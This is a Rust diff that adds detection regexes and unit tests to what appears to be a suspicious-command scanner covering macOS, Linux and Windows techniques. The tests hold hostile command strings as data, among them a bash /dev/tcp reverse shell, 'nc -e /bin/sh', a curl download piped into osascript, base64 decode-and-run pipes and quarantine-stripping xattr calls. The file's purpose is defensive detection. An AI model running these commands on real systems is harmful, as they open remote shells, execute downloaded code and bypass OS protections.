@@ -118,6 +118,48 @@ lazy_re! {
 }
 lazy_re! { pub(crate) fn mshta_remote = r#"(?i)\bmshta(\.exe)?\s+["']?https?://"#; }
 
+// ---- 1b: macOS / Linux (docs/spec/detection-rules.md §3.1) ----
+lazy_re! {
+    /// `osascript -e …` / `-l JavaScript -e …`, or a download piped into osascript.
+    pub(crate) fn osascript =
+        r#"(?im)(?:^|[\s;&|("'])osascript\s+(?:-[a-z]+\s+\S+\s+)*-e(?-u:\b)|\|\s*osascript(?-u:\b)"#;
+}
+lazy_re! {
+    /// Gatekeeper bypass: `xattr -d com.apple.quarantine`, `xattr -c` / `-cr` / `-rc`.
+    pub(crate) fn quarantine = r"(?i)(?-u:\b)xattr\s+(?:-[a-z]+\s+)*(?:-[a-z]*d[a-z]*\s+(?:-[a-z]+\s+)*com\.apple\.quarantine(?-u:\b)|-[a-z]*c[a-z]*(?-u:\b))";
+}
+lazy_re! {
+    /// Decode, then run: `base64 -d | sh`, `base64 -D` (macOS), `xxd -r -p | bash`,
+    /// `openssl base64 -d | sh`, or `sh -c "$(… | base64 -d)"` / `eval "$(… base64 -d)"`.
+    pub(crate) fn decode_shell = r#"(?im)(?:(?-u:\b)base64\s+(?:-\w+\s+)*(?:-d|-D|--decode)(?-u:\b)|(?-u:\b)xxd\s+(?:-\w+\s+)*-r(?-u:\b)|(?-u:\b)openssl\s+(?:base64|enc)(?-u:\b)[^|\r\n]*\s-d(?-u:\b))[^|\r\n]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:/(?:usr/)?bin/)?(?:(?:ba|z|k|da)?sh|python[23]?|perl|osascript)(?-u:\b)|(?:(?-u:\b)(?:ba|z|k|da)?sh(?:\s+-[a-z]+)*\s+|(?-u:\b)eval\s+)["']?\$\([^)\r\n]*(?:(?-u:\b)base64\s+(?:-\w+\s+)*(?:-d|-D|--decode)(?-u:\b)|(?-u:\b)xxd\s+(?:-\w+\s+)*-r(?-u:\b))"#;
+}
+lazy_re! {
+    /// Network shell: `/dev/tcp/host/port`, `nc -e /bin/sh`, `mkfifo … | nc`.
+    pub(crate) fn dev_tcp = r#"(?i)/dev/(?:tcp|udp)/[^\s/]+/\d+|(?-u:\b)n(?:c|cat|etcat)(?-u:\b)[^\r\n|;]*\s-[ec]\s+["']?(?:/(?:usr/)?bin/)?(?:ba|z)?sh(?-u:\b)|(?-u:\b)mkfifo(?-u:\b)[^\r\n]*\|\s*n(?:c|cat|etcat)(?-u:\b)"#;
+}
+lazy_re! {
+    /// Reverse shell (strong): an interactive shell wired to a socket.
+    pub(crate) fn reverse_shell = r#"(?i)(?-u:\b)(?:ba|z|k)?sh\s+-i(?-u:\b)[^\r\n]*/dev/(?:tcp|udp)/|/dev/(?:tcp|udp)/[^\r\n]*\d>&\d|(?-u:\b)exec\s+\d+<>\s*/dev/(?:tcp|udp)/|(?-u:\b)n(?:c|cat|etcat)(?-u:\b)[^\r\n|;]*\s-[ec]\s+["']?(?:/(?:usr/)?bin/)?(?:ba|z)?sh(?-u:\b)|(?-u:\b)mkfifo(?-u:\b)[^\r\n]*\|\s*n(?:c|cat|etcat)(?-u:\b)"#;
+}
+lazy_re! {
+    /// Detached and silenced (strong, the Unix "hidden window"): `nohup`,
+    /// `disown`, `setsid`, or output thrown away and backgrounded
+    /// (`>/dev/null 2>&1 &`, `&>/dev/null &`).
+    pub(crate) fn background = r"(?im)(?-u:\b)nohup(?-u:\b)|(?-u:\b)disown(?-u:\b)|(?-u:\b)setsid(?-u:\b)|>\s*/dev/null\s+2>&1\s*&(?:\s|;|$)|&>\s*/dev/null\s*&(?:\s|;|$)";
+}
+
+// ---- 1b: Windows (§3.1) ----
+lazy_re! {
+    /// msiexec installing a remote package without UI (`/q`, `/qn`, `/quiet`,
+    /// `/passive`; `-` works too).
+    pub(crate) fn msiexec_quiet = r"(?im)(?-u:\b)msiexec(?:\.exe)?(?-u:\b)[^\r\n]*(?:https?://[^\r\n]*\s[-/](?:q[nbr]?\+?|quiet|passive)(?-u:\b)|\s[-/](?:q[nbr]?\+?|quiet|passive)(?-u:\b)[^\r\n]*https?://)";
+}
+lazy_re! {
+    /// Hidden window through .NET: `[Diagnostics.ProcessWindowStyle]::Hidden`,
+    /// `.WindowStyle = 'Hidden'`, `CreateNoWindow = $true`.
+    pub(crate) fn hidden_window_api = r#"(?i)processwindowstyle\]\s*::\s*hidden(?-u:\b)|\.windowstyle\s*=\s*["']?hidden(?-u:\b)|(?-u:\b)createnowindow\s*=\s*\$true(?-u:\b)"#;
+}
+
 /// Per-drive "run from the mapped drive" patterns, compiled on first use.
 fn run_from_drive(drive: char) -> Option<&'static Re> {
     static CACHE: [OnceLock<Re>; 27] = [const { OnceLock::new() }; 27];
@@ -200,6 +242,14 @@ mod tests {
             check_mark(),
             padding(),
             mshta_remote(),
+            osascript(),
+            quarantine(),
+            decode_shell(),
+            dev_tcp(),
+            reverse_shell(),
+            background(),
+            msiexec_quiet(),
+            hidden_window_api(),
         ] {
             assert!(re.compiled());
         }
@@ -222,6 +272,47 @@ mod tests {
         for s in ["x -w hiddenx", "x -wo hidden", "x -w 2", "x -w hidden.ps1"] {
             assert!(!hidden_window().is_match(s), "{s}");
         }
+    }
+
+    type Case = (fn() -> &'static Re, &'static str);
+
+    #[test]
+    fn unix_signals() {
+        let yes: [Case; 12] = [
+            (osascript, "osascript -e 'display dialog \"x\"'"),
+            (osascript, "curl -s https://x.invalid/a | osascript"),
+            (quarantine, "xattr -d com.apple.quarantine /tmp/a"),
+            (quarantine, "xattr -cr ~/Downloads/A.app"),
+            (
+                quarantine,
+                "xattr -rd com.apple.quarantine /Applications/A.app",
+            ),
+            (decode_shell, "echo aGk= | base64 -D | bash"),
+            (decode_shell, "bash -c \"$(echo aGk= | base64 --decode)\""),
+            (decode_shell, "echo 6869 | xxd -r -p | sh"),
+            (dev_tcp, "cat < /dev/tcp/10.0.0.1/80"),
+            (reverse_shell, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+            (reverse_shell, "nc -e /bin/sh 10.0.0.1 4444"),
+            (background, "nohup ./x >/dev/null 2>&1 &"),
+        ];
+        for (re, s) in yes {
+            assert!(re().is_match(s), "{s}");
+        }
+        let no: [Case; 7] = [
+            (osascript, "osascript script.scpt"),
+            (quarantine, "xattr -l /tmp/a"),
+            (quarantine, "xattr -p com.apple.quarantine a"),
+            (decode_shell, "echo aGk= | base64 -d > out.txt"),
+            (reverse_shell, "cat < /dev/tcp/10.0.0.1/80"),
+            (background, "python app.py > log 2>&1 &"),
+            (msiexec_quiet, "msiexec /i https://x.invalid/a.msi"),
+        ];
+        for (re, s) in no {
+            assert!(!re().is_match(s), "{s}");
+        }
+        assert!(msiexec_quiet().is_match("msiexec /q /i https://x.invalid/a.msi"));
+        assert!(msiexec_quiet().is_match("msiexec -i https://x.invalid/a.msi -qn"));
+        assert!(hidden_window_api().is_match("$p.WindowStyle = 'Hidden'"));
     }
 
     #[test]
